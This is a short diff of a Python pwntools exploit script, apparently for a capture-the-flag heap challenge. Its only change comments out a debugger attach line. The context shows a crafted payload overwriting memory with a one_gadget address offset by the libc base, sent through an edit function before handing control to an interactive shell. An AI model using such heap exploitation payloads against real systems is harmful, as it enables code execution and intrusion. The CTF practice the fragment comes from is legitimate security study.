@@ -76,10 +76,9 @@ payload+=p64(chunk_base+0x7c0)
 payload+=p64(0)*3+p64(one_gadget+libc_base)
 
 edit(0x1111,payload)
-gdb.attach(p,gdbscript='b __libc_message\nc')
+#gdb.attach(p,gdbscript='b __libc_message\nc')
 
 sla(menu,'1')
-#sla('Length of name :',str(0x200))
 
 p.interactive()
 
